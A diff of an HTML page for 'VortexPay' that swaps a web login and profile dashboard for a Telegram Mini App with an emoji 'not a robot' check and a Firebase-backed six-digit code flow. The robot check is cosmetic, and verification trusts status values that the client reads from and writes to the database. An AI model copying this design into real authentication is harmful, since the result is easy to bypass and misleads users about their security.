@@ -1,98 +1,227 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>VortexPay — вход</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>VortexPay</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
-:root{color-scheme:dark;--bg:#07130f;--panel:#10231b;--panel2:#173328;--blue:#19b879;--blue2:#087a4c;--muted:#91afa2;--line:#244638}
-*{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at top,#123a2a 0,#07130f 58%);font:15px/1.5 Inter,system-ui,-apple-system,Segoe UI,sans-serif;color:#eef3ff;min-height:100vh}
-.top{height:76px;display:flex;align-items:center;justify-content:space-between;max-width:1120px;margin:auto;padding:0 24px;position:relative}.brand{font-weight:850;font-size:23px;letter-spacing:-.7px}.brand span{color:#5b95ff}.pill{font-size:12px;color:#a9c7ff;border:1px solid #314d7b;border-radius:999px;padding:6px 11px}
-main{max-width:1120px;margin:28px auto;padding:0 24px;display:grid;grid-template-columns:1.1fr .9fr;gap:36px;align-items:center;min-height:calc(100vh - 130px)}
-.hero h1{font-size:clamp(36px,5vw,58px);line-height:1.06;letter-spacing:-2px;margin:0 0 20px}.hero h1 span{color:#5792ff}.hero p{color:var(--muted);font-size:17px;max-width:470px}.features{display:grid;gap:13px;margin-top:28px}.feature{display:flex;gap:12px;align-items:center;color:#c8d4e9}.check{width:30px;height:30px;border-radius:9px;background:#1d3156;color:#77a8ff;display:grid;place-items:center;flex-shrink:0}
-.card{background:rgba(21,29,48,.96);border:1px solid var(--line);border-radius:22px;padding:30px;box-shadow:0 24px 80px #0004}.card h2{margin:0 0 6px;font-size:25px}.sub{color:var(--muted);margin:0 0 25px}.label{display:block;font-weight:650;font-size:13px;margin:17px 0 8px;color:#dce6f7}input{width:100%;background:#0e1628;color:white;border:1px solid #35425b;border-radius:11px;padding:14px 15px;font:inherit;outline:none}input:focus{border-color:#5792ff;box-shadow:0 0 0 3px #3478f625}button{width:100%;border:0;border-radius:11px;padding:14px 16px;background:linear-gradient(100deg,var(--blue),var(--blue2));color:white;font:700 15px inherit;cursor:pointer;margin-top:18px;box-shadow:0 8px 24px #2463e944}button:disabled{opacity:.55;cursor:not-allowed}.hint{font-size:12px;color:var(--muted);margin-top:11px}.message{display:none;margin-top:15px;padding:11px 13px;border-radius:10px;font-size:13px}.message.show{display:block}.message.error{background:#4a202a;color:#ffb9c3}.message.ok{background:#173c34;color:#a7f2d8}.timer{color:#ffc96b;font-weight:700}.hidden{display:none!important}.top-profile{display:none;position:relative;margin-left:auto;margin-right:14px}.top-profile.show{display:block}.top-avatar{width:42px;height:42px;border:2px solid #236849;border-radius:50%;object-fit:cover;cursor:pointer;background:#153c2b;display:grid;place-items:center;color:#d9ffea;font-weight:800}.top-avatar:hover{border-color:#37df91;box-shadow:0 0 0 4px #19b87922}.tooltip{position:absolute;right:0;top:48px;background:#10271d;border:1px solid #2b5a42;padding:6px 10px;border-radius:8px;font-size:12px;white-space:nowrap;opacity:0;pointer-events:none;transform:translateY(-3px);transition:.15s;z-index:5}.top-profile:hover .tooltip{opacity:1;transform:translateY(0)}.profile-actions{display:flex;gap:10px;align-items:center;margin-top:14px}.secondary{background:#203b2e!important;box-shadow:none!important}.page-title{display:flex;align-items:center;gap:10px}.reviews{margin-top:18px;border:1px solid var(--line);background:#0d1e16;padding:15px;border-radius:12px}.badge-dev{font-size:11px;color:#c4d5cc;border:1px solid #426453;border-radius:999px;padding:4px 8px}.avatar-large{width:76px;height:76px;border-radius:22px;object-fit:cover;background:#173b2a;display:grid;place-items:center;font-size:30px;border:1px solid #326b4b}.file-input{display:none}
-.account{display:none}.account.show{display:block}.profiletop{display:flex;align-items:center;gap:14px;margin:20px 0}.avatar{width:54px;height:54px;border-radius:16px;background:#243a61;display:grid;place-items:center;font-size:24px}.online{font-size:12px;color:#65e3b0}.info{background:#0e1628;border:1px solid var(--line);padding:15px;border-radius:12px;margin-top:10px}.info small{display:block;color:var(--muted);margin-bottom:4px}.settings{margin-top:20px;border-top:1px solid var(--line);padding-top:16px}.settingrow{display:flex;justify-content:space-between;gap:15px;align-items:center;margin:14px 0}.settingrow small{display:block;color:var(--muted)}input[type=checkbox]{width:18px;height:18px;accent-color:var(--blue)}footer{text-align:center;color:#73819b;font-size:12px;padding:20px}
-@media(max-width:800px){main{grid-template-columns:1fr;gap:22px;margin:12px auto}.hero{padding:10px 0}.hero h1{font-size:39px}.features{display:none}.card{padding:23px}.top{padding:0 18px}}
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  body{font-family:-apple-system,Inter,Segoe UI,Roboto,sans-serif;background:#07060f;color:#fff;min-height:100vh;
+       display:flex;align-items:center;justify-content:center;padding:20px;overflow:hidden}
+  .bg{position:fixed;inset:-50%;background:conic-gradient(from 0deg,#6d28d9,#2563eb,#06b6d4,#a21caf,#6d28d9);
+      filter:blur(90px);opacity:.35;animation:spin 18s linear infinite;z-index:-1}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .card{width:100%;max-width:380px;background:rgba(20,18,35,.75);backdrop-filter:blur(20px);
+        border:1px solid rgba(255,255,255,.08);border-radius:24px;padding:28px 22px;text-align:center}
+  .logo{font-size:44px;animation:spin 6s linear infinite;display:inline-block}
+  h1{font-size:24px;font-weight:800;margin:8px 0 4px;background:linear-gradient(90deg,#a78bfa,#60a5fa,#22d3ee);
+     -webkit-background-clip:text;color:transparent}
+  .sub{color:#a1a1c2;font-size:14px;margin-bottom:20px}
+  blockquote{border-left:3px solid #8b5cf6;background:rgba(139,92,246,.1);padding:10px 14px;border-radius:0 12px 12px 0;
+             text-align:left;font-size:14px;color:#d4d4f5;margin:14px 0}
+  b{font-weight:800}
+  .screen{display:none}.screen.active{display:block;animation:fade .35s ease}
+  @keyframes fade{from{opacity:0;transform:translateY(10px)}to{opacity:1}}
+  .robot{display:flex;align-items:center;gap:14px;background:#11101f;border:1px solid #2a2845;border-radius:14px;
+         padding:16px;cursor:pointer;user-select:none}
+  .box{width:28px;height:28px;border:2px solid #6b6b8f;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+  .box.load{border-color:transparent;border-top-color:#8b5cf6;border-radius:50%;animation:spin .7s linear infinite}
+  .box.ok{background:#22c55e;border-color:#22c55e}.box.ok::after{content:"✓";font-weight:900}
+  .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:14px}
+  .grid button{font-size:30px;padding:14px 0;background:#11101f;border:1px solid #2a2845;border-radius:14px;cursor:pointer}
+  .grid button:active{transform:scale(.95)}
+  .otp{display:flex;gap:8px;justify-content:center;margin:18px 0}
+  .otp input{width:46px;height:56px;text-align:center;font-size:24px;font-weight:800;color:#fff;background:#11101f;
+             border:2px solid #2a2845;border-radius:12px;outline:none}
+  .otp input:focus{border-color:#8b5cf6}
+  .shake{animation:shake .4s}@keyframes shake{25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}
+  .btn{width:100%;padding:15px;border:0;border-radius:14px;font-size:16px;font-weight:800;color:#fff;cursor:pointer;
+       background:linear-gradient(90deg,#7c3aed,#2563eb);margin-top:6px}
+  .btn:disabled{opacity:.45}
+  .timer{font-size:14px;color:#a1a1c2}.timer b{color:#fff}
+  .err{color:#f87171;font-size:14px;min-height:20px;font-weight:700}
+  .big{font-size:64px;margin:10px 0}
 </style>
 </head>
 <body>
-<header class="top"><div class="brand">Vortex<span>Pay</span></div><div class="top-profile" id="topProfile"><img class="top-avatar" id="topAvatar" alt="Аватар профиля" title="Профиль"><span class="tooltip">Профиль</span></div><div class="pill" id="securePill">Защищённый вход</div></header>
-<main>
-<section class="hero">
-  <h1>Твой аккаунт.<br><span>Твои правила.</span></h1>
-  <p>Личный профиль VortexPay — в одном месте. Запроси одноразовый код через нашего Telegram-бота, чтобы войти.</p>
-  <div class="features"><div class="feature"><div class="check">✓</div><div>Код действует только 30 секунд</div></div><div class="feature"><div class="check">✓</div><div>Без пароля от Telegram</div></div><div class="feature"><div class="check">✓</div><div>Профиль и настройки торговли</div></div></div>
-</section>
-<section class="card">
-  <div id="loginView">
-    <h2>Вход в VortexPay</h2><p class="sub">Подтверди, что это твой аккаунт.</p>
-    <div id="step1">
-      <label class="label" for="username">Telegram username</label>
-      <input id="username" autocomplete="username" placeholder="@username" maxlength="33">
-      <button id="sendBtn">Получить код в Telegram</button>
-      <p class="hint">Сначала открой своего VortexPay-бота и нажми /start. Код придёт в чат с ботом.</p>
+<div class="bg"></div>
+<div class="card">
+  <div class="logo">🌀</div>
+  <h1>VortexPay</h1>
+
+  <!-- 1. Проверка на робота -->
+  <div class="screen active" id="s-robot">
+    <p class="sub"><b>Шаг 1 из 2</b> · Проверка безопасности</p>
+    <div class="robot" id="robot"><div class="box" id="box"></div><b>Я не робот</b></div>
+    <div id="challenge" style="display:none">
+      <blockquote>Выбери значок <b id="target"></b></blockquote>
+      <div class="grid" id="grid"></div>
     </div>
-    <div id="step2" class="hidden">
-      <label class="label" for="otp">Шестизначный код</label>
-      <input id="otp" inputmode="numeric" autocomplete="one-time-code" placeholder="000000" maxlength="6">
-      <p class="hint">Код истечёт через <span class="timer" id="countdown">30</span> сек.</p>
-      <button id="verifyBtn">Войти</button>
-      <button id="backBtn" style="background:#26334b;box-shadow:none;margin-top:9px">Запросить новый код</button>
-    </div>
-    <div id="msg" class="message" role="status"></div>
+    <p class="err" id="robot-err" style="margin-top:12px"></p>
   </div>
-  <div id="accountView" class="account">
-    <div id="dashboardView">
-      <h2>VortexPay</h2><p class="sub">Ты вошёл в систему.</p>
-      <div class="profiletop"><img class="avatar" id="dashboardAvatar" alt="Аватар" style="object-fit:cover"><div><strong id="profileName">username</strong><div class="online" id="onlineStatus">● Онлайн</div><button id="openProfileBtn" class="secondary" style="width:auto;padding:8px 12px;margin-top:8px">Открыть профиль</button></div></div>
-      <div class="info"><small>Статус аккаунта</small><strong>✓ Авторизация подтверждена</strong><div class="hint">Доступ к личному кабинету открыт.</div></div>
-      <div class="reviews"><div class="page-title"><strong>Отзывы</strong><span class="badge-dev">В разработке</span></div><div class="hint">Раздел отзывов пока недоступен. Мы сообщим, когда он появится.</div></div>
-      <div class="settings"><h3>Настройки</h3>
-        <div class="settingrow"><div><strong>Push-уведомления</strong><small>Уведомления VortexPay в браузере</small></div><input id="pushToggle" type="checkbox" aria-label="Push-уведомления"></div>
-        <h3>Торговля</h3>
-        <label class="settingrow"><span><strong>Показывать мои предложения</strong><small>Другие пользователи видят предложения</small></span><input id="showOffers" type="checkbox" checked></label>
-        <label class="settingrow"><span><strong>Скрывать мои предложения</strong><small>Предложения видны только в профиле</small></span><input id="hideOffers" type="checkbox"></label>
-      </div>
-      <button id="logoutBtn" class="secondary">Выйти</button>
-    </div>
-    <div id="profileView" class="hidden">
-      <div class="page-title"><h2 style="margin:0">Профиль</h2></div><p class="sub">Информация о твоём аккаунте VortexPay.</p>
-      <div class="profiletop"><img class="avatar-large" id="profileAvatar" alt="Аватар профиля"><div><strong id="profileFullName">Пользователь</strong><div id="profileUsername" class="hint">@username</div><div class="online" id="profileOnline">● Онлайн</div></div></div>
-      <input type="file" id="avatarFile" class="file-input" accept="image/png,image/jpeg,image/webp,image/gif">
-      <div class="profile-actions"><button id="changeAvatarBtn" style="margin-top:0">Изменить аватарку</button><button id="backDashboardBtn" class="secondary" style="margin-top:0">Назад</button></div>
-      <div class="info"><small>Дата регистрации</small><strong id="registered">Уточняется</strong><div class="hint" id="elapsed"></div></div>
-      <div class="info"><small>Telegram ID</small><strong id="telegramId">—</strong></div>
-      <div class="reviews"><div class="page-title"><strong>Отзывы</strong><span class="badge-dev">В разработке</span></div><div class="hint">Отзывы пока не доступны — раздел находится в разработке.</div></div>
-    </div>
+
+  <!-- 2. Ввод кода -->
+  <div class="screen" id="s-code">
+    <p class="sub"><b>Шаг 2 из 2</b> · Код подтверждения</p>
+    <blockquote id="code-info">⏳ <b>Отправляем код в бота…</b></blockquote>
+    <div class="otp" id="otp"></div>
+    <p class="err" id="code-err"></p>
+    <p class="timer" id="timer"></p>
+    <button class="btn" id="confirm" disabled>Подтвердить</button>
+    <button class="btn" id="resend" style="display:none;background:#2a2845">Отправить код снова</button>
   </div>
-</section>
-</main><footer>VortexPay · Безопасный вход по одноразовому коду</footer>
-<script>
-const $=id=>document.getElementById(id);
-let countdownInterval=null, deadline=0, currentUser=null;
-function showMsg(text,type='error'){const el=$('msg');el.textContent=text;el.className='message show '+type}
-function clearMsg(){$('msg').className='message'}
-async function api(path,data={},method='POST'){
- const r=await fetch(path,{method,headers:{'Content-Type':'application/json'},credentials:'same-origin',...(method==='GET'?{}:{body:JSON.stringify(data)})});
- const j=await r.json().catch(()=>({error:'Сервер вернул некорректный ответ'}));if(!r.ok)throw new Error(j.error||'Ошибка запроса');return j;
+
+  <!-- 3. Результат -->
+  <div class="screen" id="s-done">
+    <div class="big" id="done-icon">✅</div>
+    <h2 id="done-title"><b>Верификация пройдена</b></h2>
+    <blockquote id="done-text">Добро пожаловать в <b>VortexPay</b>!</blockquote>
+    <button class="btn" onclick="Telegram.WebApp.close()">Закрыть</button>
+  </div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getAnalytics, isSupported } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-analytics.js";
+import { getDatabase, ref, set, update, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBZ8Qm4BeX6U1vCMNb-_FgNBp0OQUkC-9k",
+  authDomain: "tetete-d31c8.firebaseapp.com",
+  databaseURL: "https://tetete-d31c8-default-rtdb.firebaseio.com",
+  projectId: "tetete-d31c8",
+  storageBucket: "tetete-d31c8.firebasestorage.app",
+  messagingSenderId: "130781376435",
+  appId: "1:130781376435:web:8588052eb0f36ce99fe5c6",
+  measurementId: "G-B9J1GPPJZF"
+};
+const app = initializeApp(firebaseConfig);
+isSupported().then(ok => ok && getAnalytics(app));
+const db = getDatabase(app);
+
+const tg = Telegram.WebApp; tg.ready(); tg.expand();
+tg.setHeaderColor?.("#07060f"); tg.setBackgroundColor?.("#07060f");
+const haptic = t => tg.HapticFeedback?.notificationOccurred(t);
+const $ = id => document.getElementById(id);
+const show = id => { document.querySelectorAll(".screen").forEach(s => s.classList.remove("active")); $(id).classList.add("active"); };
+
+const uid = tg.initDataUnsafe?.user?.id;
+if (!uid) { $("robot-err").innerHTML = "<b>Открой MiniApp через бота VortexPay</b>"; }
+const node = uid ? ref(db, `verify/${uid}`) : null;
+
+/* ---------- Проверка на робота ---------- */
+const ICONS = ["🌀","💎","🚀","🔒","⚡","🪙"];
+$("robot").onclick = () => {
+  if (!uid || $("box").className !== "box") return;
+  $("box").className = "box load";
+  setTimeout(() => {
+    $("box").className = "box ok";
+    const target = ICONS[Math.floor(Math.random() * ICONS.length)];
+    $("target").textContent = target;
+    $("grid").innerHTML = "";
+    [...ICONS].sort(() => Math.random() - .5).forEach(ic => {
+      const b = document.createElement("button"); b.textContent = ic;
+      b.onclick = () => {
+        if (ic === target) { haptic("success"); show("s-code"); requestCode(); }
+        else { haptic("error"); $("robot-err").innerHTML = "<b>Неверно, попробуй ещё раз</b>";
+               $("box").className = "box"; $("challenge").style.display = "none"; }
+      };
+      $("grid").appendChild(b);
+    });
+    $("challenge").style.display = "block"; $("robot-err").textContent = "";
+  }, 1200);
+};
+
+/* ---------- OTP поля ---------- */
+const inputs = [];
+for (let i = 0; i < 6; i++) {
+  const inp = document.createElement("input");
+  inp.inputMode = "numeric"; inp.maxLength = 1; inp.autocomplete = "one-time-code";
+  inp.oninput = () => {
+    inp.value = inp.value.replace(/\D/g, "");
+    if (inp.value && i < 5) inputs[i + 1].focus();
+    checkFilled();
+  };
+  inp.onkeydown = e => { if (e.key === "Backspace" && !inp.value && i > 0) inputs[i - 1].focus(); };
+  inp.onpaste = e => {
+    e.preventDefault();
+    const d = (e.clipboardData.getData("text").match(/\d/g) || []).slice(0, 6);
+    d.forEach((v, k) => inputs[k].value = v); inputs[Math.min(d.length, 5)].focus(); checkFilled();
+  };
+  inputs.push(inp); $("otp").appendChild(inp);
 }
-function startTimer(seconds){clearInterval(countdownInterval);deadline=Date.now()+seconds*1000;const tick=()=>{let left=Math.max(0,Math.ceil((deadline-Date.now())/1000));$('countdown').textContent=left;if(left<=0){clearInterval(countdownInterval);showMsg('Код истёк. Запроси новый код.','error');$('verifyBtn').disabled=true}};tick();countdownInterval=setInterval(tick,250)}
-function fallbackAvatar(name){return 'data:image/svg+xml;charset=utf-8,'+encodeURIComponent(`<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128"><rect width="128" height="128" rx="28" fill="#17452f"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" font-family="Arial" font-size="56" fill="#d8ffe8">${String(name||'V').slice(0,1).toUpperCase()}</text></svg>`)}
-function setAvatar(el,data,name){if(!el)return;el.src=data||fallbackAvatar(name);el.onerror=()=>{el.onerror=null;el.src=fallbackAvatar(name)}}
-function showAccount(d){currentUser=d;$('loginView').classList.add('hidden');$('accountView').classList.add('show');$('topProfile').classList.add('show');$('securePill').textContent='● В системе';$('profileName').textContent='@'+d.username;$('profileFullName').textContent=d.first_name||d.username;$('profileUsername').textContent='@'+d.username;$('registered').textContent=d.registered_at||'Дата регистрации не указана';$('elapsed').textContent=d.elapsed||'';$('telegramId').textContent=d.telegram_id||'—';$('onlineStatus').textContent=d.online?'● Онлайн':'● Не в сети';$('profileOnline').textContent=d.online?'● Онлайн':'● Не в сети';setAvatar($('topAvatar'),d.avatar_data,d.first_name||d.username);setAvatar($('dashboardAvatar'),d.avatar_data,d.first_name||d.username);setAvatar($('profileAvatar'),d.avatar_data,d.first_name||d.username);loadSettings(d.settings||{})}
-$('sendBtn').onclick=async()=>{clearMsg();$('sendBtn').disabled=true;try{const username=$('username').value.trim().replace(/^@/,'');const d=await api('/api/request-code',{username});$('step1').classList.add('hidden');$('step2').classList.remove('hidden');$('otp').focus();$('verifyBtn').disabled=false;startTimer(30);showMsg(d.message||'Код отправлен в Telegram.','ok')}catch(e){showMsg(e.message)}finally{$('sendBtn').disabled=false}};
-$('backBtn').onclick=()=>{clearInterval(countdownInterval);$('step2').classList.add('hidden');$('step1').classList.remove('hidden');$('otp').value='';clearMsg()};
-$('verifyBtn').onclick=async()=>{clearMsg();$('verifyBtn').disabled=true;try{const d=await api('/api/verify-code',{username:$('username').value.trim().replace(/^@/,''),code:$('otp').value.trim()});clearInterval(countdownInterval);showAccount(d)}catch(e){showMsg(e.message);$('verifyBtn').disabled=Date.now()>=deadline}};
-$('otp').addEventListener('input',()=>{$('otp').value=$('otp').value.replace(/\D/g,'').slice(0,6)});
-function loadSettings(s){$('pushToggle').checked=!!s.push_enabled;$('showOffers').checked=s.show_offers!==false;$('hideOffers').checked=!!s.hide_offers}
-async function saveSettings(){try{await api('/api/settings',{push_enabled:$('pushToggle').checked,show_offers:$('showOffers').checked,hide_offers:$('hideOffers').checked});showMsg('Настройки сохранены.','ok')}catch(e){showMsg(e.message)}}
-['pushToggle','showOffers','hideOffers'].forEach(id=>$(id).addEventListener('change',async()=>{if(id==='showOffers'&&$('showOffers').checked)$('hideOffers').checked=false;if(id==='hideOffers'&&$('hideOffers').checked)$('showOffers').checked=false;await saveSettings()}));
-function openProfile(){ $('dashboardView').classList.add('hidden');$('profileView').classList.remove('hidden');window.scrollTo({top:0,behavior:'smooth'}) }
-function backDashboard(){ $('profileView').classList.add('hidden');$('dashboardView').classList.remove('hidden') }
-$('topAvatar').onclick=openProfile;$('openProfileBtn').onclick=openProfile;$('backDashboardBtn').onclick=backDashboard;
-$('changeAvatarBtn').onclick=()=>$('avatarFile').click();
-$('avatarFile').addEventListener('change',async()=>{const file=$('avatarFile').files?.[0];if(!file)return;if(!/^image\/(png|jpeg|webp|gif)$/.test(file.type)){showMsg('Выбери PNG, JPG, WEBP или GIF.');return}if(file.size>1024*1024){showMsg('Максимальный размер аватарки — 1 МБ.');return}const reader=new FileReader();reader.onload=async()=>{try{const result=await api('/api/avatar',{avatar_data:reader.result});currentUser.avatar_data=result.avatar_data;setAvatar($('topAvatar'),result.avatar_data,currentUser.first_name);setAvatar($('dashboardAvatar'),result.avatar_data,currentUser.first_name);setAvatar($('profileAvatar'),result.avatar_data,currentUser.first_name);showMsg('Аватарка обновлена.','ok')}catch(e){showMsg(e.message)}};reader.readAsDataURL(file)});
-$('logoutBtn').onclick=async()=>{try{await api('/api/logout',{})}catch{}location.reload()};
-(async()=>{try{const d=await api('/api/me',{},'GET');if(d.authenticated)showAccount(d)}catch{}})();
+const getCode = () => inputs.map(i => i.value).join("");
+const clearOtp = () => { inputs.forEach(i => i.value = ""); checkFilled(); };
+function checkFilled() {
+  const full = getCode().length === 6;
+  $("confirm").disabled = !full || phase !== "sent";
+  if (full && phase === "sent") submit();
+}
+
+/* ---------- Логика кода ---------- */
+let phase = "idle", timerId = null, lastErrT = 0;
+
+function requestCode() {
+  phase = "waiting"; clearOtp();
+  $("code-info").innerHTML = "⏳ <b>Отправляем код в бота…</b>";
+  $("code-err").textContent = ""; $("timer").textContent = "";
+  $("resend").style.display = "none";
+  set(node, { status: "requested", ts: serverTimestamp() });
+}
+
+function startTimer(sec) {
+  clearInterval(timerId);
+  let left = sec;
+  const tick = () => {
+    $("timer").innerHTML = `Код действует ещё <b>${left} сек</b>`;
+    if (left-- <= 0) clearInterval(timerId);
+  };
+  tick(); timerId = setInterval(tick, 1000);
+}
+
+function submit() {
+  phase = "checking"; $("confirm").disabled = true;
+  update(node, { attempt: getCode() });
+}
+$("confirm").onclick = submit;
+$("resend").onclick = requestCode;
+
+if (node) onValue(node, snap => {
+  const v = snap.val(); if (!v) return;
+  if (v.status === "sent") {
+    if (phase === "waiting") {
+      phase = "sent";
+      $("code-info").innerHTML = "📩 <b>Код отправлен в бота!</b><br>Введи <b>6 цифр</b> из сообщения.";
+      startTimer(v.ttl || 30); inputs[0].focus();
+    }
+    if (v.error && v.error.t !== lastErrT) {
+      lastErrT = v.error.t; phase = "sent"; haptic("error");
+      $("code-err").innerHTML = `<b>Неверный код.</b> Осталось попыток: ${v.error.left}`;
+      $("otp").classList.add("shake"); setTimeout(() => $("otp").classList.remove("shake"), 400);
+      clearOtp(); inputs[0].focus();
+    }
+  }
+  if (v.status === "expired" && phase !== "idle") {
+    phase = "expired"; clearInterval(timerId); haptic("warning");
+    $("code-info").innerHTML = "⌛ <b>Код устарел.</b> Запроси новый.";
+    $("timer").textContent = ""; $("code-err").textContent = "";
+    $("resend").style.display = "block"; $("confirm").disabled = true;
+  }
+  if (v.status === "ok") {
+    clearInterval(timerId); haptic("success"); show("s-done");
+  }
+  if (v.status === "blocked") {
+    clearInterval(timerId); haptic("error");
+    $("done-icon").textContent = "⛔";
+    $("done-title").innerHTML = "<b>Слишком много попыток</b>";
+    $("done-text").innerHTML = "Код аннулирован. Открой MiniApp заново через бота.";
+    show("s-done");
+  }
+  if (v.status === "no_user") {
+    $("code-info").innerHTML = "⚠️ <b>Сначала нажми /start в боте</b>";
+  }
+});
 </script>
-</body></html>
+</body>
+</html>
